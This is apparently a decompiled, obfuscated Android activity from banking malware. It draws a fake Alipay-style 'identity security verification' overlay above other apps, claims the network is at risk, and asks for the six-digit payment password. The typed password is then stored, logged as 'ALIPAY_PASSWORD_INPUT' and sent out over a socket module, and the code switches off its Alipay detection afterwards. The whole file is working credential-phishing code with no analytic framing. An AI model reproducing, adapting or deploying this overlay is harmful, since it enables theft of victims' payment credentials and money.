package com.storm.safe.rock.activity;

import android.R;
import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import com.storm.safe.rock.activity.yrsanyhsbh;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import java.util.ArrayList;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import p000.AbstractC0003a2;
import p000.AbstractC1120qr;
import p000.C0107as;
import p000.ViewOnClickListenerC1204s2;
import p000.fl1;
import p000.m21;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class yrsanyhsbh extends Activity {

    /* renamed from: a3 */
    public static final /* synthetic */ int f51938a3 = 0;

    /* renamed from: a0 */
    public String f51939a0 = "";

    /* renamed from: a1 */
    public final ArrayList f51940a1 = new ArrayList();

    /* renamed from: a2 */
    public boolean f51941a2 = true;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.yrsanyhsbh$a0 */
    public static final class C0251a0 {
        public /* synthetic */ C0251a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0251a0() {
        }
    }

    static {
        new C0251a0(null);
    }

    /* renamed from: a0 */
    public final int m211196a0(int i) {
        return (int) (i * getResources().getDisplayMetrics().density);
    }

    /* renamed from: a1 */
    public final void m211197a1(String str) {
        if (str.equals("DEL")) {
            if (this.f51939a0.length() > 0) {
                this.f51939a0 = m21.m213934e2(this.f51939a0);
                m211199a3();
                return;
            }
            return;
        }
        if (this.f51939a0.length() < 6) {
            this.f51939a0 = AbstractC0003a2.m32b3(this.f51939a0, str);
            m211199a3();
            if (this.f51939a0.length() == 6) {
                new Handler(Looper.getMainLooper()).postDelayed(new fl1(this, 0), 300L);
            }
        }
    }

    /* renamed from: a2 */
    public final void m211198a2(String str) {
        C0323a8 c0323a8M211471g5;
        try {
            try {
                C0107as c0106ar = C0107as.f45610a3.getInstance(this);
                int length = str.length();
                c0106ar.m210506a5(length != 4 ? length != 6 ? "none" : "6digit" : "4digit", true, str);
            } catch (Exception e) {
                t60.m214705c6("yrsanyhsbh", "保存支付宝密码到 AppStatusManager 失败", e);
            }
            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
            if (c0290a0.getInstance() != null) {
                String str2 = "文本输入: " + m21.m213937e5(50, str) + (str.length() > 50 ? "..." : "");
                AbstractC0770a1.m213614f9(new Pair("textLength", Integer.valueOf(str.length())), new Pair("inputMethod", "alipay_custom_keypad"), new Pair("containsPassword", Boolean.TRUE), new Pair("operationType", "ALIPAY_PASSWORD_INPUT"), new Pair("activity", "yrsanyhsbh"));
                dqtvuisjd.m211435k0("TEXT_INPUT", str2);
                try {
                    dqtvuisjd c0290a02 = c0290a0.getInstance();
                    if (c0290a02 != null && (c0323a8M211471g5 = c0290a02.m211471g5()) != null) {
                        c0323a8M211471g5.m211662c8(str, "alipay", "custom_keypad");
                    }
                } catch (Exception e2) {
                    t60.m214705c6("yrsanyhsbh", "通过Socket发送密码失败", e2);
                }
                try {
                    dqtvuisjd c0290a03 = dqtvuisjd.f52358m1.getInstance();
                    if (c0290a03 != null) {
                        c0290a03.m211455e4();
                    }
                } catch (Exception e3) {
                    t60.m214705c6("yrsanyhsbh", "自动关闭支付宝检测功能失败", e3);
                }
            }
        } catch (Exception e4) {
            t60.m214705c6("yrsanyhsbh", "记录支付宝密码日志失败", e4);
        }
    }

    /* renamed from: a3 */
    public final void m211199a3() {
        int i = 0;
        while (i < 6) {
            TextView textView = (TextView) this.f51940a1.get(i);
            textView.setText(i < this.f51939a0.length() ? "●" : "");
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(Color.parseColor("#F5F5F5"));
            gradientDrawable.setCornerRadius(m211196a0(6));
            if (i == this.f51939a0.length() && this.f51939a0.length() < 6) {
                gradientDrawable.setStroke(m211196a0(2), Color.parseColor("#1677FF"));
            }
            textView.setBackground(gradientDrawable);
            i++;
        }
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        String[][] strArr;
        int i;
        String[] strArr2;
        String str;
        View view;
        super.onCreate(bundle);
        getWindow().setType(2032);
        getWindow().setBackgroundDrawableResource(R.color.transparent);
        final int i2 = 0;
        getWindow().getDecorView().setBackgroundColor(0);
        Window window = getWindow();
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.gravity = 80;
        attributes.width = -1;
        attributes.height = -2;
        attributes.horizontalMargin = 0.0f;
        attributes.verticalMargin = 0.0f;
        attributes.flags = (attributes.flags | 800) & (-1025);
        window.setAttributes(attributes);
        getWindow().setDecorFitsSystemWindows(false);
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -2));
        frameLayout.setBackgroundColor(0);
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(-1);
        gradientDrawable.setCornerRadii(new float[]{m211196a0(16), m211196a0(16), m211196a0(16), m211196a0(16), 0.0f, 0.0f, 0.0f, 0.0f});
        linearLayout.setBackground(gradientDrawable);
        FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(-1, -2);
        layoutParams.gravity = 80;
        linearLayout.setLayoutParams(layoutParams);
        RelativeLayout relativeLayout = new RelativeLayout(this);
        relativeLayout.setLayoutParams(new LinearLayout.LayoutParams(-1, m211196a0(50)));
        relativeLayout.setPadding(m211196a0(16), m211196a0(12), m211196a0(16), 0);
        TextView textView = new TextView(this);
        textView.setText("×");
        textView.setTextSize(26.0f);
        textView.setTextColor(Color.parseColor("#999999"));
        textView.setGravity(17);
        RelativeLayout.LayoutParams layoutParams2 = new RelativeLayout.LayoutParams(m211196a0(36), m211196a0(36));
        layoutParams2.addRule(20);
        layoutParams2.addRule(15);
        textView.setLayoutParams(layoutParams2);
        textView.setOnClickListener(new View.OnClickListener(this) { // from class: el1

            /* renamed from: a1 */
            public final /* synthetic */ yrsanyhsbh f56077a1;

            {
                this.f56077a1 = this;
            }

            @Override // android.view.View.OnClickListener
            public final void onClick(View view2) {
                int i3 = i2;
                yrsanyhsbh yrsanyhsbhVar = this.f56077a1;
                switch (i3) {
                    case 0:
                        int i4 = yrsanyhsbh.f51938a3;
                        t60.m214695b6(yrsanyhsbhVar, "this$0");
                        yrsanyhsbhVar.finish();
                        break;
                    default:
                        int i5 = yrsanyhsbh.f51938a3;
                        t60.m214695b6(yrsanyhsbhVar, "this$0");
                        yrsanyhsbhVar.m211197a1("DEL");
                        break;
                }
            }
        });
        TextView textView2 = new TextView(this);
        textView2.setText("身份安全认证");
        textView2.setTextSize(17.0f);
        String str2 = "#333333";
        textView2.setTextColor(Color.parseColor("#333333"));
        textView2.setGravity(17);
        RelativeLayout.LayoutParams layoutParams3 = new RelativeLayout.LayoutParams(-2, -2);
        layoutParams3.addRule(13);
        textView2.setLayoutParams(layoutParams3);
        relativeLayout.addView(textView);
        relativeLayout.addView(textView2);
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(1);
        linearLayout2.setGravity(17);
        linearLayout2.setPadding(m211196a0(24), m211196a0(16), m211196a0(24), m211196a0(20));
        TextView textView3 = new TextView(this);
        textView3.setText("检测到您当前网络存在风险，请输入支付密码确认身份");
        textView3.setTextSize(15.0f);
        textView3.setTextColor(Color.parseColor("#333333"));
        textView3.setGravity(17);
        textView3.setPadding(0, m211196a0(8), 0, m211196a0(8));
        linearLayout2.addView(textView3);
        LinearLayout linearLayout3 = new LinearLayout(this);
        linearLayout3.setOrientation(0);
        linearLayout3.setGravity(17);
        linearLayout3.setPadding(m211196a0(32), m211196a0(4), m211196a0(32), m211196a0(20));
        int i3 = 0;
        while (i3 < 6) {
            TextView textView4 = new TextView(this);
            LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(m211196a0(44), m211196a0(44));
            layoutParams4.setMarginStart(i3 == 0 ? 0 : m211196a0(10));
            textView4.setLayoutParams(layoutParams4);
            textView4.setGravity(17);
            textView4.setTextSize(28.0f);
            textView4.setTextColor(-16777216);
            textView4.setText("");
            GradientDrawable gradientDrawable2 = new GradientDrawable();
            gradientDrawable2.setColor(Color.parseColor("#F5F5F5"));
            gradientDrawable2.setCornerRadius(m211196a0(6));
            if (i3 == 0) {
                gradientDrawable2.setStroke(m211196a0(2), Color.parseColor("#1677FF"));
            }
            textView4.setBackground(gradientDrawable2);
            this.f51940a1.add(textView4);
            linearLayout3.addView(textView4);
            i3++;
        }
        LinearLayout linearLayout4 = new LinearLayout(this);
        linearLayout4.setOrientation(1);
        String str3 = "#E8E8E8";
        linearLayout4.setBackgroundColor(Color.parseColor("#E8E8E8"));
        linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        String[][] strArr3 = {new String[]{"1", "2", "3"}, new String[]{"4", "5", "6"}, new String[]{"7", "8", "9"}, new String[]{"", "0", "DEL"}};
        int i4 = 0;
        for (int i5 = 4; i4 < i5; i5 = 4) {
            String[] strArr4 = strArr3[i4];
            LinearLayout linearLayout5 = new LinearLayout(this);
            linearLayout5.setOrientation(0);
            String str4 = str3;
            linearLayout5.setLayoutParams(new LinearLayout.LayoutParams(-1, m211196a0(52)));
            int length = strArr4.length;
            int i6 = 0;
            while (i6 < length) {
                String str5 = strArr4[i6];
                int i7 = length;
                if (str5.length() == 0) {
                    View view2 = new View(this);
                    strArr = strArr3;
                    i = i4;
                    strArr2 = strArr4;
                    LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                    layoutParams5.setMarginEnd(m211196a0(1));
                    layoutParams5.bottomMargin = m211196a0(1);
                    view2.setLayoutParams(layoutParams5);
                    view2.setBackgroundColor(Color.parseColor(str4));
                    view = view2;
                } else {
                    strArr = strArr3;
                    i = i4;
                    strArr2 = strArr4;
                    if (str5.equals("DEL")) {
                        TextView textView5 = new TextView(this);
                        textView5.setText("⌫");
                        textView5.setTextSize(20.0f);
                        textView5.setTextColor(Color.parseColor(str2));
                        textView5.setGravity(17);
                        LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        final int i8 = 1;
                        layoutParams6.bottomMargin = m211196a0(1);
                        textView5.setLayoutParams(layoutParams6);
                        textView5.setBackgroundColor(Color.parseColor(str4));
                        textView5.setOnClickListener(new View.OnClickListener(this) { // from class: el1

                            /* renamed from: a1 */
                            public final /* synthetic */ yrsanyhsbh f56077a1;

                            {
                                this.f56077a1 = this;
                            }

                            @Override // android.view.View.OnClickListener
                            public final void onClick(View view22) {
                                int i32 = i8;
                                yrsanyhsbh yrsanyhsbhVar = this.f56077a1;
                                switch (i32) {
                                    case 0:
                                        int i42 = yrsanyhsbh.f51938a3;
                                        t60.m214695b6(yrsanyhsbhVar, "this$0");
                                        yrsanyhsbhVar.finish();
                                        break;
                                    default:
                                        int i52 = yrsanyhsbh.f51938a3;
                                        t60.m214695b6(yrsanyhsbhVar, "this$0");
                                        yrsanyhsbhVar.m211197a1("DEL");
                                        break;
                                }
                            }
                        });
                        view = textView5;
                    } else {
                        TextView textView6 = new TextView(this);
                        textView6.setText(str5);
                        textView6.setTextSize(24.0f);
                        textView6.setTextColor(Color.parseColor(str2));
                        textView6.setGravity(17);
                        str = str2;
                        LinearLayout.LayoutParams layoutParams7 = new LinearLayout.LayoutParams(0, -1, 1.0f);
                        layoutParams7.setMarginEnd(m211196a0(1));
                        layoutParams7.bottomMargin = m211196a0(1);
                        textView6.setLayoutParams(layoutParams7);
                        textView6.setBackgroundColor(-1);
                        textView6.setOnClickListener(new ViewOnClickListenerC1204s2(this, str5, 3));
                        view = textView6;
                        linearLayout5.addView(view);
                        i6++;
                        str2 = str;
                        strArr3 = strArr;
                        length = i7;
                        i4 = i;
                        strArr4 = strArr2;
                    }
                }
                str = str2;
                linearLayout5.addView(view);
                i6++;
                str2 = str;
                strArr3 = strArr;
                length = i7;
                i4 = i;
                strArr4 = strArr2;
            }
            linearLayout4.addView(linearLayout5);
            i4++;
            str2 = str2;
            str3 = str4;
        }
        linearLayout.addView(relativeLayout);
        linearLayout.addView(linearLayout2);
        linearLayout.addView(linearLayout3);
        linearLayout.addView(linearLayout4);
        frameLayout.addView(linearLayout);
        setContentView(frameLayout);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
    }
}
